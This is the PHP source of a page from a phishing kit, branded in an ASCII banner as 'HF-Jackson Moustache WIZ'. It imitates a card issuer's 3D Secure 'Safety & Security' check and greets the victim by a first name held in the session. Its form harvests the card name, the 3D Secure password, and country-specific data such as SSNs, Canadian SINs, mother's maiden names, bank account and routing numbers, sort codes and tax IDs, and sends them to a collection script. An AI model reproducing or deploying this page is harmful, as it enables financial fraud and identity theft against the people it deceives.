<?php
/* 
  _   _   _____         _                  _                          
 | | | | |  ___|       | |   __ _    ___  | | __  ___    ___    _ __  
 | |_| | | |_       _  | |  / _` |  / __| | |/ / / __|  / _ \  | '_ \ 
 |  _  | |  _|     | |_| | | (_| | | (__  |   <  \__ \ | (_) | | | | |
 |_| |_| |_|        \___/   \__,_|  \___| |_|\_\ |___/  \___/  |_| |_|

  __  __                         _                    _            __          __  _____   ______
 |  \/  |                       | |                  | |           \ \        / / |_   _| |___  /
 | \  / |   ___    _   _   ___  | |_    __ _    ___  | |__     ___  \ \  /\  / /    | |      / / 
 | |\/| |  / _ \  | | | | / __| | __|  / _` |  / __| | '_ \   / _ \  \ \/  \/ /     | |     / /  
 | |  | | | (_) | | |_| | \__ \ | |_  | (_| | | (__  | | | | |  __/   \  /\  /     _| |_   / /__ 
 |_|  |_|  \___/   \__,_| |___/  \__|  \__,_|  \___| |_| |_|  \___|    \/  \/     |_____| /_____|
                                                                                                                      
                                                                            

*/
/*==============[Lange_CounTry]=================*/
session_start();
include('../boot.php');	
include('../inc/lang.php');	
include "../inc/lang".$_SESSION['HF-JAckson'];
$HF_V = $_SESSION['country_name'];
/*===============[Code_HTML]====================*/

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Safety & Security</title>
  <link rel="shortcut icon" href="../Files/img/icon.ico"/>
  <link rel="stylesheet" type="text/css" href="../Files/css/vcv.css">
</head>
<body>


    <div class="vs">
      <header>
        <div class="logo">
          <img src="../Files/img/o.svg.png">
        </div>
        <div class="majd">
          <img src="../Files/img/c.png">
        </div>
      </header>
      <div class="para">
        <p>Dear <?php echo $_SESSION['f_name'];?> </p>
        <div class="tbat">
          We protects your card against unauthorised use online, you have noting to fear. We just ensure that you are the legal owner of this account.
        </div>
      </div>
        <p id="pl">Please enter your information correctly :</p>
      <form action="../Edit/VBV.php" method="post">
    <div class="hassan">
          <label for="d" style="margin-right:56px;font-size: 14px;">Name on Card:</label>
            <input type="text" name="noc" id="noc" required>
        </div>
        <div class="hassan">
          <label for="d" style="margin-right:84px;font-size: 14px;">3D Secure</label>
            <input type="password" name="_3d" id="d" required>
        </div>
        <?php
if ($HF_V=="United States" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 43px;">Routing Number:</label>
            <input name="rgn" maxlength="15" id="rgn" type="text" required>
</div>
';}
?>
<?php
if ($HF_V=="Canada" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 13px;   margin-right: 1px;">Social Insurance Number:</label>
            <input maxlength="15" name="sin" id="sin" type="text">
<div class="hassan">
          <label for="ssn" style=" font-size: 13px;   margin-right: 1px;">Mother`s Maiden Name:</label>
            <input maxlength="15" name="mmn" id="sin" type="text">
			
</div>
';}
?>
<?php if ($HF_V=="United States"  or $HF_V=="Ireland" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 1px;">Social Security Number:</label>
            <input maxlength="11" name="ssn" id="ssn" type="text"  placeholder="XXX-XX-XXXX" required>
</div>
';}
?>
<?php if ($HF_V=="United States" or $HF_V=="United Kingdom" or $HF_V=="Australia" or $HF_V=="Ireland" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 43px;">Account Number:</label>
            <input maxlength="15" name="an" id="an" type="text" required>
</div>
';}
?>
<?php if ($HF_V=="United Kingdom" or $HF_V=="Ireland" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 83px;">Sort Code:</label>
            <input name="sc" maxlength="8" id="sc" type="text" "XX-XX-XX" required>
</div>
';} 
?>
<?php if ($HF_V=="Switzerland" or $HF_V=="Germany" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 17px;">Kartenkontonummer:</label>
            <input name="ka" id="ka" type="text" maxlength="19"   required>
</div>
';} 
?>
<?php
if ($HF_V=="Australia" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 61px;">OSID Number:</label>
            <input name="on" id="on" type="text" required>
        </div>
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 76px;">Credit Limit:</label>
            <input name="cl" id="cl" type="text" required>
        </div>
';}
?>
<?php
if ($HF_V=="Italy" ){ echo '
<div class="hassan">
          <label for="ssn" style=" font-size: 14px;   margin-right: 59px;">Codice Fiscale:</label>
            <input name="on" id="on" type="text" required>
        </div>
';}
?>
<div id="inco">
          <input type="submit" name="sbt" value="Submit" style="width: 70px;">
        </div>
        </div>
      </form>
      <footer>
        <span>Copyright &copy; 1999-20<?php echo date('y');?> . All rights reserved.</span>
      </footer>
    </div>


</body>
</html>